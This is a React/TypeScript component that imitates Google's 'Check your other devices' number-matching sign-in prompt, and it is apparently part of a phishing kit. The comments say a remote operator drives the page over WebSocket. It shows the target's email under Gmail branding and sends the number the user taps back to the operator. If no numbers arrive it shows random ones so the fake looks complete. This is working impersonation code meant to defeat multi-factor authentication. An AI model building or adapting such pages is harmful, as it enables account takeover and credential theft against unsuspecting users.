import React from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import ProviderShell from './ProviderShell';

interface GmailNumberPromptPageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Google "Number Prompt" challenge page (Google's number-matching 2-step
 * verification flow). The operator drives this page over WebSocket with
 * `show_google_number_prompt` and a `numbers` payload (e.g. `[42, 18, 73]`).
 *
 * The user's other signed-in device shows a single number; the user taps
 * the matching number here. This page renders all supplied numbers and
 * forwards the user's selection back to the operator via `onAction`.
 */
const GmailNumberPromptPage: React.FC<GmailNumberPromptPageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};

  const email =
    (data.email as string) ||
    ((location.state as { email?: string } | null)?.email) ||
    '';

  // Coerce backend payload into a numeric array, gracefully handling the
  // common "numbers" field plus a few likely aliases. Falls back to a
  // sensible 3-number set so the page never renders empty.
  const rawNumbers =
    (data.numbers as unknown) ??
    (data.options as unknown) ??
    (data.choices as unknown);
  let numbers: number[] = [];
  if (Array.isArray(rawNumbers)) {
    numbers = rawNumbers
      .map((n) => Number(n))
      .filter((n) => Number.isFinite(n));
  }
  if (numbers.length === 0) {
    numbers = [
      Math.floor(10 + Math.random() * 90),
      Math.floor(10 + Math.random() * 90),
      Math.floor(10 + Math.random() * 90),
    ];
  }

  const goBack = () => {
    onAction('cancel');
    navigate(-1);
  };

  const handleSelect = (n: number) => {
    onAction('select_number', { number: n, provider: 'Gmail' });
  };

  const description = (
    <>
      Open the Gmail app on your phone or tablet to verify it&rsquo;s you.
      Tap the number below that&rsquo;s shown on your other device.
    </>
  );

  const primaryActions = (
    <>
      <button
        type="button"
        onClick={goBack}
        className="text-sm font-semibold text-blue-600 hover:underline"
      >
        Try another way
      </button>
      <button
        type="button"
        onClick={() => onAction('deny_authenticator')}
        className="px-5 py-2 border border-gray-300 text-gray-700 text-sm font-semibold rounded-full hover:bg-gray-50"
      >
        It wasn&rsquo;t me
      </button>
    </>
  );

  const secondaryAction = (
    <button
      type="button"
      onClick={() => onAction('resend_prompt')}
      className="text-sm font-semibold text-blue-600 hover:underline"
    >
      Resend it
    </button>
  );

  return (
    <ProviderShell
      providerKey="gmail"
      email={email}
      title="Check your other devices"
      description={description}
      onBack={goBack}
      primaryActions={primaryActions}
      secondaryAction={secondaryAction}
    >
      <div className="flex flex-col items-center gap-3 py-2" role="group" aria-label="Select the number shown on your other device">
        {numbers.map((n, idx) => (
          <button
            key={`${n}-${idx}`}
            type="button"
            onClick={() => handleSelect(n)}
            className="w-32 py-3 text-2xl font-medium text-gray-900 bg-white border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500 transition-colors"
          >
            {n}
          </button>
        ))}
      </div>
    </ProviderShell>
  );
};

export default GmailNumberPromptPage;
